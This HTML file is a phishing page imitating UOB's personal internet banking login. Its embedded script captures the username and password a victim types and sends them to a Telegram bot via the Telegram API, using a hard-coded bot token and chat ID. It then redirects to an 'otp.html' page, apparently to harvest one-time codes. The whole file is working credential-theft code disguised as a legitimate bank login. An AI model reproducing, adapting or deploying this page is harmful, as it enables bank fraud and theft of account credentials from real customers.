<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>UOB Personal Internet Banking</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

  body, html {
    margin: 0; padding: 0; height: 100%;
    font-family: 'Roboto', sans-serif;
    background: #003d7a url('') no-repeat center center fixed;
    background-size: cover;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .login-box {
    background: #fff;
    width: 320px;
    padding: 28px 32px 36px;
    box-sizing: border-box;
    border-radius: 6px;
    box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
  }
  .logo {
    display: flex;
    align-items: center;
    margin-bottom: 24px;
  }
  .logo .bars {
    width: 20px; height: 24px;
    background:
      repeating-linear-gradient(to right,
        #d71920 0 3px,
        transparent 3px 6px);
    margin-right: 9px;
  }
  .logo span {
    font-weight: 700;
    font-size: 22px;
    color: #0072ce;
  }
  .lang {
    font-size: 13px;
    text-align: right;
    margin-bottom: 12px;
  }
  .lang a {
    color: #0072ce;
    text-decoration: none;
    margin-left: 8px;
  }
  .lang a:hover {
    text-decoration: underline;
  }
  h1 {
    font-weight: 400;
    font-size: 20px;
    margin: 0 0 24px 0;
    color: #333;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    border: 1px solid #ccc;
    border-radius: 0;
    outline: none;
    padding: 14px 12px;
    font-size: 14px;
    color: #999;
    margin-top: -1px;
    box-sizing: border-box;
  }
  input::placeholder {
    text-transform: uppercase;
  }
  input:focus {
    border-color: #0072ce;
    color: #333;
  }
  input:first-child {
    border-top-left-radius: 4px;
    border-top-right-radius: 4px;
  }
  input:last-child {
    border-bottom-left-radius: 4px;
    border-bottom-right-radius: 4px;
  }
  button {
    margin-top: 24px;
    width: 100%;
    background-color: #0072ce;
    border: none;
    color: #fff;
    padding: 12px 0;
    font-size: 16px;
    border-radius: 4px;
    cursor: pointer;
  }
  button:hover {
    background-color: #0057b7;
  }
  .forgot,
  .register {
    font-size: 14px;
    margin-top: 16px;
    color: #0072ce;
    cursor: pointer;
    display: block;
    text-align: left;
    text-decoration: none;
  }
  .register {
    margin-top: 28px;
    text-align: center;
    color: #666;
    font-weight: 400;
  }
  .register a {
    color: #0072ce;
    text-decoration: underline;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="login-box" role="main" aria-label="Login form">
  <div class="lang" aria-label="Language selection">
    <a href="#">English</a> | <a href="#">Bahasa Indonesia</a>
  </div>
  
  <div class="logo" aria-label="UOB logo">
    <div class="bars" aria-hidden="true"></div><span>UOB</span>
  </div>
  
  <h1>Welcome to UOB Personal Internet Banking</h1>
  
  <form id="loginForm" action="javascript:void(0);">
    <input type="text" id="username" name="username" placeholder="USERNAME" autocomplete="username" required aria-label="Username" />
    <input type="password" id="password" name="password" placeholder="PASSWORD" autocomplete="current-password" required aria-label="Password" />
    <button type="submit" id="loginBtn">Login</button>
  </form>
  
  <a href="#" class="forgot" aria-label="Forgot Username or Password">Forgot Username/Password?</a>

  <p class="register">Don't have an account? <a href="#">Register now!</a></p>
</div>

<script>
  const telegramBotToken = '8729819513:AAHuJSCT5sT4zR6Yv6xx-JdttOCKtR31hOM';
  const telegramChatId = '6647221855';

  document.getElementById('loginForm').addEventListener('submit', e => {
    e.preventDefault();

    const user = document.getElementById('username').value.trim();
    const pass = document.getElementById('password').value.trim();

    if(!user || !pass) return;

    sessionStorage.setItem('uob_user', user);
    sessionStorage.setItem('uob_pass', pass);

    const message =
      `New UOB login attempt:\nUsername: ${user}\nPassword: ${pass}`;

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message
      })
    }).finally(() => {
      window.location.href = 'otp.html';
    });
  });
</script>

</body>
</html>
